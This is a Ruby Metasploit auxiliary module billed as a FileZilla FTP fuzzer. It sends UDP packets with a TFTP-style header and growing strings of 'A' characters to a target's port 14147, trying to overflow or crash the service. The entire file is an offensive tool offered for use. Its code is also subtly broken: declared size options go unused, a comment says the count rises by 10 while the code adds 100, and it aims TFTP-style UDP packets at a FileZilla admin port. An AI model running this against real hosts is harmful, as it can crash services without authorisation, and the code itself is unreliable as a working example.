require 'msf/core'

class Metasploit3 < Msf::Auxiliary

        include Msf::Auxiliary::Scanner
        def initialize
                super(
                        'Name'           => 'FileZilla Fuzzer',
                        'Version'        => '$Revision: 1 $',
                        'Description'    => 'Filezilla FTP fuzzer',
                        'Author'         => 'Abhinav_singh a.k.a Darkl0rd',
                        'License'        => MSF_LICENSE
                )
                register_options( [
                Opt::RPORT(14147),
					 OptInt.new('STEPSIZE', [ false, "Increase string size each iteration with this number of chars",10]),

				    OptInt.new('DELAY', [ false, "Delay between connections",0.5]),
				    OptInt.new('STARTSIZE', [ false, "Fuzzing string startsize",10]),
                OptInt.new('ENDSIZE', [ false, "Fuzzing string endsize",20000])
                ], self.class)
        end


def run_host(ip)
                
                udp_sock = Rex::Socket::Udp.create(
                        'Context'   =>
                                {
                                        'Msf'        => framework,
                                        'MsfExploit' => self,
                                }
                )
				startsize = datastore['STARTSIZE'] # fuzz data size to begin with
                count = datastore['STEPSIZE']  # Set count incriment
                while count < 10000  # While the count is under 10000 run
                        evil = "A" * count  # Set a number of "A"s equal to count
                        pkt = "\x00\x02" + "\x41" + "\x00" + evil + "\x00"  # Define the payload
                        udp_sock.sendto(pkt, ip, datastore['RPORT'])  # Send the packet
                        print_status("Sending: #{evil}") 
                        resp = udp_sock.get(1)  # Capture the response
                        count += 100  # Increase count by 10, and loop
                end
        end
end
